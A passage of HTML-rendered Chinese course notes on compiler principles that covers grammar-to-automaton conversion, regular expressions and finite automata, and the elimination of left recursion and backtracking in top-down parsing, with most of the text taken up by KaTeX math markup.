mathnormal" style="margin-right:0.10903em;">U</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">Wa</span></span></span></span></eq>的规则，引一条从状态<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>W</mi></mrow><annotation encoding="application/x-tex">W</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span></span></span></span></eq>到<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>U</mi></mrow><annotation encoding="application/x-tex">U</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span></span></span></span></eq>的<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span></eq>弧。</li><li>形如<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>U</mi><mo>→</mo><mi>a</mi></mrow><annotation encoding="application/x-tex">U→a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span></eq>的规则，引一条从开始状态<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span></eq>到状态<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>U</mi></mrow><annotation encoding="application/x-tex">U</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span></span></span></span></eq>的标记为<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span></eq>的弧；</li><li>例子：<img src="/images/%E6%9C%AC%E7%A7%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E8%AF%BE%E7%A8%8B/%E5%B7%A6%E7%BA%BF%E6%80%A7%E6%AD%A3%E8%A7%84%E6%96%87%E6%B3%95%E5%88%B0FA.jpg" alt="左线性正规文法到FA"></li></ul></li></ul><h3 id="5-%E6%AD%A3%E8%A7%84%E8%A1%A8%E8%BE%BE%E5%BC%8F%E4%B8%8Efa" tabindex="-1">5 正规表达式与FA</h3><ul><li>正规表达式到FA：<br><img src="/images/%E6%9C%AC%E7%A7%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E8%AF%BE%E7%A8%8B/%E6%AD%A3%E8%A7%84%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%88%B0FA.jpg" alt="正规表达式到FA"></li><li>FA到正规表达式<ul><li><ol><li>创建一个起始节点S连向起始点，将所有的终点连接一个节点Z</li></ol></li><li><ol start="2"><li>随后依次去掉中间节点</li></ol></li><li><ol start="3"><li>直到最后只剩开始节点和结束节点</li></ol></li><li>例子<br><img src="/images/%E6%9C%AC%E7%A7%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E8%AF%BE%E7%A8%8B/FA%E5%88%B0RE1.jpg" alt="FA到RE1"><br><img src="/images/%E6%9C%AC%E7%A7%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E8%AF%BE%E7%A8%8B/FA%E5%88%B0RE2.jpg" alt="FA到RE2"><br><img src="/images/%E6%9C%AC%E7%A7%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E8%AF%BE%E7%A8%8B/FA%E5%88%B0RE3.jpg" alt="FA到RE3"><br><img src="/images/%E6%9C%AC%E7%A7%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E8%AF%BE%E7%A8%8B/FA%E5%88%B0RE4.jpg" alt="FA到RE4"><br><img src="/images/%E6%9C%AC%E7%A7%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E8%AF%BE%E7%A8%8B/FA%E5%88%B0RE5.jpg" alt="FA到RE5"><br><img src="/images/%E6%9C%AC%E7%A7%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E8%AF%BE%E7%A8%8B/FA%E5%88%B0RE6.jpg" alt="FA到RE6"><br><img src="/images/%E6%9C%AC%E7%A7%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E8%AF%BE%E7%A8%8B/FA%E5%88%B0RE7.jpg" alt="FA到RE7"></li></ul></li></ul><h2 id="4(1)%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90" tabindex="-1">4(1)语法分析</h2><h3 id="1-%E8%87%AA%E4%B8%8A%E8%80%8C%E4%B8%8B%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90" tabindex="-1">1 自上而下语法分析</h3><h4 id="%E8%87%AA%E4%B8%8A%E8%80%8C%E4%B8%8B%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%80%9D%E6%83%B3" tabindex="-1">自上而下语法分析的基本思想</h4><ul><li>推导——从开始/识别符号出发不断建立直接推导，试图构造一个最左推导序列，最终由它推导出与输入符号串相同的符号串</li><li>程序翻译——从语言文法的开始符号——&lt;程序&gt;出发，试图推导出文法的句子——源程序/与其等价的单词串</li><li>语法树——以开始/识别符号为根结点，试图向下构造一棵语法树，其末端结点符号串与输入符号串相同</li></ul><h4 id="%E8%87%AA%E4%B8%8A%E8%80%8C%E4%B8%8B%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%AD%E9%97%AE%E9%A2%98%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95" tabindex="-1">自上而下语法分析中问题的解决方法</h4><ul><li>无限循环：消除左递归</li><li>回溯：避免回溯</li></ul><h3 id="2-%E5%B7%A6%E9%80%92%E5%BD%92%E7%9A%84%E6%B6%88%E9%99%A4" tabindex="-1">2 左递归的消除</h3><h4 id="%E7%9B%B4%E6%8E%A5%E5%B7%A6%E9%80%92%E5%BD%92%E7%9A%84%E6%B6%88%E9%99%A4" tabindex="-1">直接左递归的消除</h4><p>设有产生式 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>→</mo><mi>A</mi><msub><mi>α</mi><mn>1</mn></msub><mi mathvariant="normal">∣</mi><mi>A</mi><msub><mi>α</mi><mn>2</mn></msub><mi mathvariant="normal">∣</mi><mo>…</mo><mi mathvariant="normal">∣</mi><mi>A</mi><msub><mi>α</mi><mi>m</mi></msub><mi mathvariant="normal">∣</mi><msub><mi>β</mi><mn>1</mn></msub><mi mathvariant="normal">∣</mi><msub><mi>β</mi><mn>2</mn></msub><mi mathvariant="normal">∣</mi><mo>…</mo><mi mathvariant="normal">∣</mi><msub><mi>β</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">A \rightarrow Aα_1|Aα_2|…|Aα_m|β_1|β_2|…|β_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">A</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord mathnormal">A</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">∣</span><span class="mord mathnormal">A</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05278em;">β</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0528em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05278em;">β</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0528em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05278em;">β</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0528em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>,其中<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mi>i</mi></msub><mo stretchy="false">(</mo><mi>i</mi><mo>=</mo><mn>1</mn><mtext>，</mtext><mn>2</mn><mtext>，</mtext><mo>…</mo><mtext>，</mtext><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">y_i(i=1，2，…，n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord cjk_fallback">，</span><span class="mord">2</span><span class="mord cjk_fallback">，</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord cjk_fallback">，</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></eq>均不以符号<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>U</mi></mrow><annotation encoding="application/x-tex">U</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span></span></span></span></eq>为首，增加新非终结符号<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>U</mi><msup><mrow></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></msup></mrow><annotation encoding="application/x-tex">U^{&#x27;}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9425em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9425em;"><span style="top:-2.9425em;margin-right:0.05em;"><span class="pstrut" style="height:2.5795em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8278em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></eq>，将上述产生式变换为:<br><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>→</mo><msub><mi>β</mi><mn>1</mn></msub><msup><mi>A</mi><msup><mrow></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></msup><mi mathvariant="normal">∣</mi><msub><mi>β</mi><mn>2</mn></msub><msup><mi>A</mi><msup><mrow></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></msup><mi mathvariant="normal">∣</mi><mo>…</mo><mi mathvariant="normal">∣</mi><msub><mi>β</mi><mi>n</mi></msub><msup><mi>A</mi><msup><mrow></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></msup></mrow><annotation encoding="application/x-tex">A→β_1A^{&#x27;}|β_2A^{&#x27;}|…|β_nA^{&#x27;}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.1925em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05278em;">β</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0528em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9425em;"><span style="top:-2.9425em;margin-right:0.05em;"><span class="pstrut" style="height:2.5795em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8278em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05278em;">β</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0528em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9425em;"><span style="top:-2.9425em;margin-right:0.05em;"><span class="pstrut" style="height:2.5795em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8278em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mord">∣</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05278em;">β</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0528em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9425em;"><span style="top:-2.9425em;margin-right:0.05em;"><span class="pstrut" style="height:2.5795em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8278em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></eq><br><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>A</mi><msup><mrow></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></msup><mo>→</mo><msub><mi>α</mi><mn>1</mn></msub><msup><mi>A</mi><msup><mrow></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></msup><mi mathvariant="normal">∣</mi><msub><mi>α</mi><mn>2</mn></msub><msup><mi>A</mi><msup><mrow></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></msup><mi mathvariant="normal">∣</mi><mo>…</mo><mi mathvariant="normal">∣</mi><msub><mi>α</mi><mi>m</mi></msub><msup><mi>A</mi><msup><mrow></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></msup><mi mathvariant="normal">∣</mi><mi>ε</mi></mrow><annotation encoding="application/x-tex">A^{&#x27;}→α_1A^{&#x27;}|α_2A^{&#x27;}|…|α_mA^{&#x27;}|ε</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9425em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9425em;"><span style="top:-2.9425em;margin-right:0.05em;"><span class="pstrut" style="height:2.5795em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8278em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.1925em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9425em;"><span style="top:-2.9425em;margin-right:0.05em;"><span class="pstrut" style="height:2.5795em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8278em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9425em;"><span style="top:-2.9425em;margin-right:0.05em;"><span class="pstrut" style="height:2.5795em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8278em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mord">∣</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9425em;"><span style="top:-2.9425em;margin-right:0.05em;"><span class="pstrut" style="height:2.5795em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8278em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord mathnormal">ε</span></span></span></span></eq></p><h4 id="%E9%97%B4%E6%8E%A5%E5%B7%A6%E9%80%92%E5%BD%92%E7%9A%84%E6%B6%88%E9%99%A4" tabindex="-1">间接左递归的消除</h4><ol><li>以某种顺序将文法非终结符排列<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>U</mi><mn>1</mn></msub><mtext>，</mtext><msub><mi>U</mi><mn>2</mn></msub><mtext>，</mtext><mo>…</mo><mtext>，</mtext><msub><mi>U</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">U_1 ，U_2 ，…，U_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">，</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">，</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord cjk_fallback">，</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq></li><li>改写文法;</li><li>化简由2得到的文法。</li></ol><p><img src="/images/%E6%9C%AC%E7%A7%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E8%AF%BE%E7%A8%8B/%E6%B6%88%E9%99%A4%E9%97%B4%E6%8E%A5%E5%B7%A6%E9%80%92%E5%BD%92.jpg" alt="消除间接左递归"></p><p><img src="/images/%E6%9C%AC%E7%A7%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E8%AF%BE%E7%A8%8B/%E6%B6%88%E9%99%A4%E5%B7%A6%E9%80%92%E5%BD%92%E4%BE%8B%E5%AD%90.jpg" alt="消除左递归例子"></p><h3 id="3-%E5%9B%9E%E6%BA%AF%E7%9A%84%E9%81%BF%E5%85%8D" tabindex="-1">3 回溯的避免</h3><h4 id="%E9%81%BF%E5%85%8D%E5%9B%9E%E6%BA%AF%E7%9A%84%E6%9D%A1%E4%BB%B6" tabindex="-1">避免回溯的条件</h4><ul><li>产生原因：<ul><li>文法中存在如下形式的产生式<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>U</mi><mo>→</mo><msub><mi>α</mi><mn>1</mn></msub><mi mathvariant="normal">∣</mi><msub><mi>α</mi><mn>2</mn></msub><mi mathvariant="normal">∣</mi><mo>…</mo><mi mathvariant="normal">∣</mi><msub><mi>α</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">U→α_1|α_2|…|α_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" 